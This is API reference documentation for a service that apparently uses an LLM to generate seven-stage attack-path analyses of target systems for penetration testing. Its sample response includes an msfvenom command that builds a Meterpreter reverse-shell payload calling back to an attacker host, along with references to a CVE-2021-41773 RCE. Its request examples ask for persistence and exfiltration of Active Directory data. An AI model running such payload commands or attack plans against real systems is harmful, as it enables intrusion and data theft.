# API Reference

Complete documentation of AI Engine endpoints, request/response formats, and error handling.

## Base URL

```
http://localhost:8000
```

Production deployments may use different hosts/ports. See [DEPLOYMENT.md](DEPLOYMENT.md).

## Authentication

Currently, no authentication is required. Security recommendations:
- Deploy behind API gateway with authentication
- Use rate limiting per client
- Implement API keys for production
- See [SECURITY.md](../SECURITY.md) for details

## Endpoints

### POST /analyze

Initiate comprehensive cybersecurity analysis on a target.

**Description**:
Generates a complete 7-stage attack path analysis with context threading and continuity validation.

**Request**:

```http
POST /analyze HTTP/1.1
Host: localhost:8000
Content-Type: application/json

{
  "target_description": "Linux web server running Apache 2.4.41 on Ubuntu 20.04, 10.0.0.5",
  "context": "Internal penetration test, authorized access, capture C2 communication"
}
```

**Request Schema**:

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| `target_description` | string | Yes | Target system details | "Windows Server 2019, vulnerable to MS17-010" |
| `context` | string | No | Additional scenario context | "Red team exercise, establish persistence" |

**Request Limits**:
- Max field length: 10,000 characters
- Max total request size: 50,000 characters
- Timeout: 60 seconds

**Response**:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "primary_path": [
    {
      "stage_index": 1,
      "stage_name": "Reconnaissance",
      "techniques": [
        "T1592.004 - Gather Victim Host Information: Client Configurations"
      ],
      "findings": "Initial reconnaissance reveals Apache 2.4.41...",
      "tools_used": [
        "nmap",
        "ssl-enum-ciphers"
      ],
      "artifact_name": null,
      "commands": [
        "nmap -sV -p 80,443 10.0.0.5"
      ],
      "content": "## Stage 1: Reconnaissance\n\n### Target Identification\n..."
    },
    {
      "stage_index": 2,
      "stage_name": "Weaponization",
      "techniques": [
        "T1656 - Craft Malware"
      ],
      "findings": "CVE-2021-41773 allows remote code execution...",
      "tools_used": [
        "metasploit",
        "msfvenom"
      ],
      "artifact_name": "apache_rce_shell.elf",
      "commands": [
        "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.100 -f elf -o apache_rce_shell.elf"
      ],
      "content": "## Stage 2: Weaponization\n\n### Exploit Selection\n..."
    },
    {
      "stage_index": 3,
      "stage_name": "Delivery",
      "artifact_name": "apache_rce_shell.elf",
      "content": "..."
    },
    {
      "stage_index": 4,
      "stage_name": "Exploitation",
      "artifact_name": "apache_rce_shell.elf",
      "content": "..."
    },
    {
      "stage_index": 5,
      "stage_name": "Installation",
      "artifact_name": "apache_rce_shell.elf",
      "content": "..."
    },
    {
      "stage_index": 6,
      "stage_name": "Command & Control",
      "artifact_name": null,
      "content": "..."
    },
    {
      "stage_index": 7,
      "stage_name": "Actions on Objectives",
      "artifact_name": null,
      "content": "..."
    }
  ],
  "model_used": "gpt-4o-mini",
  "total_tokens": 12547,
  "validation_report": {
    "is_valid": true,
    "total_checks": 4,
    "passes": [
      "Artifact continuity: Stage 2 payload referenced in stages 3-5",
      "Vulnerability continuity: CVE-2021-41773 flows through exploitation",
      "Technique alignment: MITRE ATT&CK progression logical",
      "Tool consistency: metasploit ecosystem tools compatible"
    ],
    "warnings": [],
    "stage_artifacts": {
      "1": null,
      "2": "apache_rce_shell.elf",
      "3": "apache_rce_shell.elf",
      "4": "apache_rce_shell.elf",
      "5": "apache_rce_shell.elf",
      "6": null,
      "7": null
    }
  }
}
```

**Response Schema**:

```typescript
{
  primary_path: StageAnalysis[],
  model_used: string,
  total_tokens: number,
  validation_report: ValidationReport
}
```

**StageAnalysis**:

| Field | Type | Description |
|-------|------|-------------|
| `stage_index` | integer | Stage number (1-7) |
| `stage_name` | string | Stage name (Reconnaissance, Weaponization, etc.) |
| `techniques` | string[] | MITRE ATT&CK identifiers and names |
| `findings` | string | Key findings for this stage |
| `tools_used` | string[] | Tools identified for this stage |
| `artifact_name` | string \| null | Artifact (file, script, etc.) if applicable |
| `commands` | string[] | Example commands for this stage |
| `content` | string | Full markdown content for this stage |

**ValidationReport**:

| Field | Type | Description |
|-------|------|-------------|
| `is_valid` | boolean | Overall validation result |
| `total_checks` | integer | Number of checks performed |
| `passes` | string[] | Checks that passed |
| `warnings` | string[] | Non-fatal issues detected |
| `stage_artifacts` | object | Artifact tracking: stage → artifact_name |

**Success Response Codes**:
- `200 OK` - Analysis successful, returned in response body
- `202 Accepted` - Analysis queued (future async mode)

**Typical Response Time**: 10-20 seconds

**Example cURL Request**:

```bash
curl -X POST "http://localhost:8000/analyze" \
  -H "Content-Type: application/json" \
  -d '{
    "target_description": "Linux web server running Apache 2.4.41 on Ubuntu 20.04",
    "context": "Authorized penetration test"
  }' \
  --max-time 60
```

**Example Python Request**:

```python
import requests
import json

url = "http://localhost:8000/analyze"
payload = {
    "target_description": "Windows Server 2019, vulnerable to MS17-010",
    "context": "Red team exercise"
}

response = requests.post(url, json=payload, timeout=60)
result = response.json()

print(f"Model: {result['model_used']}")
print(f"Tokens: {result['total_tokens']}")
print(f"Valid: {result['validation_report']['is_valid']}")

for stage in result['primary_path']:
    print(f"\nStage {stage['stage_index']}: {stage['stage_name']}")
    print(f"Artifact: {stage['artifact_name']}")
```

### GET /status

Check service status.

**Description**:
Returns basic status information about the AI Engine service.

**Request**:

```http
GET /status HTTP/1.1
Host: localhost:8000
```

**Response**:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "ready",
  "service": "AI Engine",
  "version": "1.0.0"
}
```

**Response Schema**:

```typescript
{
  status: "ready" | "degraded" | "error",
  service: string,
  version: string
}
```

**Status Values**:
- `ready` - Service operational, ready for requests
- `degraded` - Service running but with warnings
- `error` - Service not operational

### GET /ready

Health check for Kubernetes/orchestration.

**Description**:
Liveness probe endpoint. Returns 200 if service is ready.

**Request**:

```http
GET /ready HTTP/1.1
Host: localhost:8000
```

**Response**:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "ready": true
}
```

**Response Codes**:
- `200 OK` - Service ready
- `503 Service Unavailable` - Service not ready

## Error Handling

### Error Response Format

All errors return appropriate HTTP status codes with error details:

```json
{
  "detail": "Description of what went wrong",
  "status": 400,
  "timestamp": "2024-01-15T10:30:00Z"
}
```

### Common Error Scenarios

#### 400 Bad Request

Invalid request format or schema validation failed.

```json
{
  "detail": "target_description is required",
  "status": 400
}
```

Causes:
- Missing required fields
- Invalid field types
- Fields exceed max length
- Malformed JSON

**Resolution**: Verify request schema matches API documentation.

#### 408 Request Timeout

Request processing exceeded timeout (60 seconds).

```json
{
  "detail": "Request timeout after 60 seconds",
  "status": 408
}
```

Causes:
- OpenAI API slow
- Network latency issues
- High server load

**Resolution**: 
- Retry after brief delay
- Simplify input
- Check OpenAI status: https://status.openai.com

#### 429 Too Many Requests

Rate limit exceeded.

```json
{
  "detail": "Rate limit exceeded: 10 requests per minute",
  "status": 429
}
```

Causes:
- Too many requests from same IP/key
- OpenAI account rate limits

**Resolution**:
- Implement backoff/retry logic
- Space requests at least 6 seconds apart
- Contact support for increased limits

#### 500 Internal Server Error

Server error during processing.

```json
{
  "detail": "Internal server error",
  "status": 500
}
```

Causes:
- Unexpected exception
- LLM provider issue
- Configuration error
- Database connectivity issue

**Resolution**:
1. Check service logs
2. Verify configuration
3. Retry after 30 seconds
4. Contact support with request ID

#### 503 Service Unavailable

Service temporarily unavailable.

```json
{
  "detail": "Service temporarily unavailable",
  "status": 503
}
```

Causes:
- Deployment in progress
- OpenAI service degradation
- Database connection issue

**Resolution**:
- Wait a few minutes and retry
- Check status page
- Contact support

### Error Handling Best Practices

**Implement Retry Logic**:

```python
import time
import requests

def analyze_with_retry(target, context, max_retries=3):
    for attempt in range(max_retries):
        try:
            response = requests.post(
                "http://localhost:8000/analyze",
                json={
                    "target_description": target,
                    "context": context
                },
                timeout=60
            )
            
            if response.status_code == 200:
                return response.json()
            elif response.status_code == 429:
                wait_time = (2 ** attempt) + random.random()
                print(f"Rate limited, waiting {wait_time:.1f}s...")
                time.sleep(wait_time)
                continue
            elif response.status_code >= 500:
                print(f"Server error, retrying ({attempt + 1}/{max_retries})...")
                time.sleep(5)
                continue
            else:
                response.raise_for_status()
                
        except requests.exceptions.Timeout:
            print(f"Timeout on attempt {attempt + 1}, retrying...")
            time.sleep(5)
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            raise
    
    raise Exception("Failed after max retries")

result = analyze_with_retry(
    "Linux web server Apache 2.4.41",
    "Authorized penetration test"
)
```

## Rate Limiting

Rate limits are based on account tier. Default limits:
- **Free tier**: 3 requests/minute
- **Pro tier**: 10 requests/minute
- **Enterprise**: Custom limits

Rate limit headers:
```
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 7
X-RateLimit-Reset: 1705324200
```

## Request Examples

### Example 1: Linux Web Server Analysis

```bash
curl -X POST "http://localhost:8000/analyze" \
  -H "Content-Type: application/json" \
  -d '{
    "target_description": "Linux web server running Apache 2.4.41 on Ubuntu 20.04, public IP 203.0.113.42, port 80 and 443 open",
    "context": "Authorized security assessment, capture shell access"
  }'
```

### Example 2: Windows Server Analysis

```bash
curl -X POST "http://localhost:8000/analyze" \
  -H "Content-Type: application/json" \
  -d '{
    "target_description": "Windows Server 2019 domain controller, vulnerable to MS17-010, internal network 192.168.1.100",
    "context": "Red team exercise, establish persistence and exfiltrate Active Directory data"
  }'
```

### Example 3: Using Pre-made Request File

```bash
# From examples/requests/
curl -X POST "http://localhost:8000/analyze" \
  -H "Content-Type: application/json" \
  -d @examples/requests/linux_web_server_enhanced.json
```

## Response Examples

See `examples/responses/complete_analysis_response.json` for a complete response example.

## Versioning

Current API version: **1.0**

Future versions will maintain backward compatibility. Breaking changes will:
1. Increment API version (v2, v3, etc.)
2. Support old versions for 12 months
3. Require explicit version header for new versions
4. Be documented in CHANGELOG.md

## Deprecation Policy

Deprecated endpoints will:
1. Be marked deprecated in documentation
2. Return `Deprecation` header in responses
3. Function for minimum 6 months
4. Be announced in CHANGELOG

## SDK

### Python SDK (Planned)

```python
from ai_engine import Client

client = Client(api_key="sk-...")
result = client.analyze(
    target_description="...",
    context="..."
)
```

## Related Documentation

- [Architecture](ARCHITECTURE.md) - System design
- [Security](../SECURITY.md) - Security guidelines
- [Examples](../examples/) - Sample requests/responses

---

Last updated: 2024
API Version: 1.0
